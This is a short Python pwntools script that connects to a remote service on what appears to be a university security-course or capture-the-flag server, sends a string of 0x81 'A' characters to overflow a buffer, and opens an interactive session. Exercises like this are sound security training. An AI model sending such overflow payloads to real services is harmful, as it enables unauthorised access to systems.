from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22151)

print(s.recvline())
s.sendline("A"*0x81)

s.interactive()
